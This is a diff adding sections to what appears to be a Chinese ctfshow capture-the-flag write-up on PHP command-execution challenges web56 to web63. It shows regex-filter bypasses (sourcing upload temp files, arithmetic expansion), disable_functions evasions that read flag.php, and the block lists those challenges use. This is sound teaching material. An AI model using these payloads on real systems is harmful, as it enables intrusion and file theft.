@@ -2280,4 +2280,340 @@ $'\143\141\164'   →   cat
 | s | 115 | \163 |
 | 空格 | 32 | \040 |
 
-> 顺带：`/???/???` 这种直接匹配命令名的写法也能用，但会一次匹配到多个（cat、sed…），变成“第一个当命令、其余当参数”，不可控；推荐用 `$'...'` 精确构造。
+> 顺带：`/???/???` 这种写法看起来能匹配命令名，但会一次匹配到多个（apt、awk…），“第一个当命令、其余当参数”，实际不可控（在 BusyBox 镜像里首个匹配甚至可能是 `bc`、`arping` 这类）；推荐用 `$'...'` 精确构造。
+
+### web56
+
+![image-20261107154608421](/assets/ctfshow-web-command-exec/image-20261107154608421.png)
+
+**无字母无数字，但 `.` 和上传临时文件还在**
+
+```php
+if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
+    system($c);
+}
+```
+
+- 封：`;`、所有字母（大小写）、数字、`$`、`(`、`{`、引号、反引号、`%`、Tab、`&`、`>`、`<`
+- 没封：`.`、空格、`/`、`?`、`[`、`]`、`@`、`-`、`|`、`#`、换行等
+
+#### 思路：`.`(source) + 文件上传的临时文件
+
+1. `.` 是 shell 的 source 命令（读入一个文件并执行），它不含任何字母
+2. PHP 处理文件上传时，会先把上传内容存成**临时文件**，命名类似 `/tmp/phpXXXXXX`（`php` + 6 位随机字符）
+3. 这个临时文件在**本次请求处理期间是存在的**（请求结束才删除）
+4. 我们上传一个内容为 `cat flag.php` 的文件，同时让 `c` 去 source 这个临时文件
+
+#### 为什么是 `/???/????????[@-[]`
+
+- `/???` → `/tmp`
+- `????????` → 8 个任意字符
+- `[@-[]` → 字符类，`@` 到 `[` 的 ASCII 区间正好包含 **A-Z**（大写字母）
+
+拼起来就是 `php` + 6 位随机字符（最后一位用大写字母过滤，提高命中率）。
+
+#### 复现步骤
+
+1. 本地建 `payload.txt`，内容：
+   ```
+   cat flag.php
+   ```
+2. 发 multipart POST（Burp 里就是改第一行再带上传体）：
+   ```
+   POST /?c=.%20/???/????????[@-[] HTTP/1.1
+   Host: xxx.challenge.ctf.show
+   Content-Type: multipart/form-data; boundary=----xxx
+
+   ------xxx
+   Content-Disposition: form-data; name="file"; filename="a.txt"
+   Content-Type: text/plain
+
+   cat flag.php
+   ------xxx--
+   ```
+3. 响应里就是 `cat flag.php` 的输出
+
+curl 一行版：
+
+```bash
+printf 'cat flag.php\n' > payload.txt
+curl -sk -F "file=@payload.txt" "http://靶机/?c=.%20/???/????????[@-[]"
+```
+
+实测**第一次就出**——临时文件在请求处理期间一直存在，竞态窗口其实很大。如果碰上最后一位不是大写字母，多提交几次即可。
+
+
+
+### web57
+
+![image-20261107154625657](/assets/ctfshow-web-command-exec/image-20261107154625657.png)
+
+**代码会拼 `.php`，flag 在 `36.php`**
+
+```php
+if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
+    system("cat ".$c.".php");
+}
+```
+
+- 封：`;`、字母、数字、反引号、`|#`、引号、`%`、Tab、`&`、换行、`>`、`<`、`.`、`,`、`?`、`*`、`-`、`=`、`[`
+- 注释写明：flag 在 `36.php`
+- 代码是 `cat $c.php`，只要让 `$c` 展开成 `36` 就行
+
+#### 思路：用 shell 算术展开拼出 36
+
+`$`、`(`、`)`、`!`、`#`、`+` 都没有被封，可以用算术展开：
+
+- `$#` 是特殊变量，表示位置参数个数 → 在 `sh -c` 里是 **0**
+- 算术上下文里 `!` 是逻辑非 → `!0` = **1**
+- 把 36 个 `!$#` 加起来 → 36
+
+payload 形式：
+
+```
+?c=$((!$#+!$#+!$#+……+!$#))
+```
+
+（一共 36 个 `!$#`，总长约 150 字符）
+
+生成脚本：
+
+```python
+terms = "+".join(["!$#"] * 36)
+print("c=$((%s))" % terms)
+```
+
+执行过程：
+
+1. `$((...))` 先做算术展开 → `36`
+2. 命令变成 `cat 36.php`
+3. 输出 flag
+
+#### 注意
+
+`#` 在 URL 里会被浏览器当成锚点，必须编码成 `%23`（curl 的 `--data-urlencode` 会自动处理）。这一步和 web49 的 `%09` 同理：**服务器先做 URL 解码，再做正则**，所以 `%23` 解码成 `#` 后照样能过。
+
+### web58
+
+![image-20261107221754900](/assets/ctfshow-web-command-exec/image-20261107221754900.png)
+
+**没有正则过滤了，但 `disable_functions` 把危险函数禁了**
+
+```php
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+- **只收 POST**，没有任何 `preg_match`
+- 但 `system()` 这类函数被 `disable_functions` 禁用：
+
+```
+Warning: system() has been disabled for security reasons
+```
+
+#### 关键：eval 是 PHP 代码执行，不一定非要 shell
+
+被禁的是“执行系统命令”的那批函数，PHP 自带的读文件函数还在：
+
+```
+c=echo(file_get_contents('flag.php'));
+c=readfile('flag.php');
+c=highlight_file('flag.php');
+```
+
+三条都直接出 flag。
+
+#### 本题的 disable_functions（实测）
+
+```
+phpinfo,apache_child_terminate,apache_setenv,chgrp,chmod,chown,
+curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,
+ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,
+passthru,pcntl_*,popen,posix_kill,proc_*,putenv,readlink,
+shell_exec,symlink,syslog,system
+```
+
+命令执行系（system/exec/shell_exec/passthru/popen/proc_open）全在里面，但 `file_get_contents`、`readfile`、`highlight_file` 都还能用。
+
+#### 怎么自己看禁用了什么
+
+```
+c=echo(ini_get('disable_functions'));
+```
+
+`ini_get` 本身没有被禁。
+
+
+
+
+
+### web59
+
+![image-20261107221838465](/assets/ctfshow-web-command-exec/image-20261107221838465.png)
+
+**在 web58 基础上又禁了 `file_get_contents` 和 `readfile`**
+
+源码和 web58 一模一样（POST + `eval($c)`），区别只在 `disable_functions` 末尾多了两个：
+
+```
+...,system,file_get_contents,readfile
+```
+
+所以 web58 的写法在这里会失败：
+
+```
+Warning: file_get_contents() has been disabled for security reasons
+```
+
+#### 换其他读文件方法（全部实测出 flag）
+
+| 方法 | payload |
+| :--- | :--- |
+| 高亮源码 | `c=highlight_file('flag.php');` |
+| `file()` 读成数组再拼 | `c=echo(implode('',file('flag.php')));` |
+| `fopen` + `fread` | `c=$f=fopen('flag.php','r');echo(fread($f,9999));` |
+| `include` 执行后取变量 | `c=include('flag.php');echo($flag);` |
+
+- `highlight_file` / `show_source`：直接把源码打印出来
+- `file()`：按行读成数组，`implode` 拼成一个字符串
+- `fopen` + `fread`：文件句柄方式读
+- `include`：包含执行 `flag.php`，里面的 `$flag` 被赋值，再 `echo` 出来
+
+#### 一句话
+
+`disable_functions` 也是黑名单：**禁了 `system` 不等于禁了“读文件”，禁了 `file_get_contents` 也不等于禁了所有读法**。黑名单永远有漏。
+
+### web60
+
+![image-20261107224429905](/assets/ctfshow-web-command-exec/image-20261107224429905.png)
+
+**在 web59 基础上继续加禁用**
+
+源码还是 POST + `eval($c)`，只在 `disable_functions` 末尾追加：
+
+```
+...,file_get_contents,readfile,fread,fgets,fgetss,file,
+readfile,fpassthru,parse_ini_file
+```
+
+（`readfile` 写了两遍）
+
+也就是说：`file_get_contents`、`readfile`、`file`、`fread`、`fgets`、`fpassthru` 这些常规读法全灭了。
+
+#### 但 `highlight_file` 没被禁
+
+```
+c=highlight_file('flag.php');
+```
+
+直接出 flag。
+
+#### 为什么它一定没被禁
+
+看题目自己的代码：`else{ highlight_file(__FILE__); }`——**它要靠 highlight_file 把源码显示给你看**。禁了它，题目页面都打不开。所以出题人不可能禁用这个函数。
+
+同理，`show_source` 是它的别名，也可以用。
+
+
+
+### web61
+
+![image-20261107224447640](/assets/ctfshow-web-command-exec/image-20261107224447640.png)
+
+**继续加禁用：连 `fopen` 都禁了**
+
+在 web60 基础上再追加：
+
+```
+...,copy,rename,fopen,fgetc,serialize
+```
+
+现在 `fopen` 也没了，常规的 `fopen + fread` 路线彻底断掉。
+
+#### 能用的方法（实测）
+
+| 方法 | payload |
+| :--- | :--- |
+| 高亮源码 | `c=highlight_file('flag.php');` |
+| 别名 | `c=show_source('flag.php');` |
+| `SplFileObject` | `c=$f=new SplFileObject('flag.php');foreach($f as $l){echo $l;}` |
+| 列目录 | `c=print_r(glob('*'));` |
+
+- `SplFileObject` 是 SPL 的面向对象文件类，内部实现不走 `fopen` 这个**函数名**，所以黑名单管不到
+- `glob` 也没被禁，可以列目录确认文件名
+
+#### 一句话
+
+`disable_functions` 加到这份上，`highlight_file` 依然必须可用（题目自己要显示源码），所以 web58~61 四题其实是**同一条 payload**：
+
+```
+c=highlight_file('flag.php');
+```
+
+这四题真正想教的是：**黑名单只加“常见的”，永远漏“不常见的”**——`highlight_file`、`SplFileObject`、`glob` 都是漏网之鱼。
+
+### web62
+
+![image-20261107230411028](/assets/ctfshow-web-command-exec/image-20261107230411028.png)
+
+**禁用表扩充到 64 个**
+
+源码不变（POST + `eval($c)`），`disable_functions` 完整列表（实测 64 项）：
+
+```
+apache_child_terminate,apache_setenv,chgrp,chmod,chown,copy,curl_exec,
+curl_init,curl_multi_exec,dl,error_log,error_reporting,exec,fclose,
+fgetc,fgets,fgetss,file,file_get_contents,file_put_contents,fopen,
+fpassthru,fread,fsockopen,fwrite,imap_mail,imap_open,ini_alter,
+ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,
+pcntl_*,phpinfo,popen,posix_kill,proc_*,putenv,readfile,readlink,
+rename,serialize,shell_exec,symlink,syslog,system,tempnam
+```
+
+注意：连 `error_reporting`、`error_log`、`file_put_contents`、`fwrite`、`fclose`、`fsockopen`、`curl_init` 都禁了。
+
+但 **`highlight_file` / `show_source` 依然不在名单里**：
+
+```
+c=highlight_file('flag.php');
+```
+
+直接出 flag。
+
+#### 为什么这招永远有效
+
+题目自己的 `else` 分支就是 `highlight_file(__FILE__)`——禁了它，题目页面都打不开。
+
+
+
+### web63
+
+![image-20261107230420302](/assets/ctfshow-web-command-exec/image-20261107230420302.png)
+
+**只多禁了一个 `gc_collect_cycles`**
+
+web63 的禁用表 = web62 + `gc_collect_cycles`（共 65 个）。
+
+`gc_collect_cycles` 是经典的 `disable_functions` 绕过链（GC + 析构函数）里会用到的函数，出题人加它是在防“进阶绕过”。
+
+但本题根本用不上那么复杂——`highlight_file` 依然可用：
+
+```
+c=highlight_file('flag.php');
+```
+
+直接出 flag。
+
+#### 小结：web58~63 六题
+
+源码一模一样（POST + `eval($c)`，无 preg 过滤），只是 `disable_functions` 越来越长；解法始终是：
+
+```
+c=highlight_file('flag.php');
+```
+
+真正要记的是：**题目自己要用的函数，出题人不敢禁**——`highlight_file` 就是那个“必须留着”的函数。次选是 `show_source`、`SplFileObject`、`glob` 这些“不在黑名单里”的等价物。
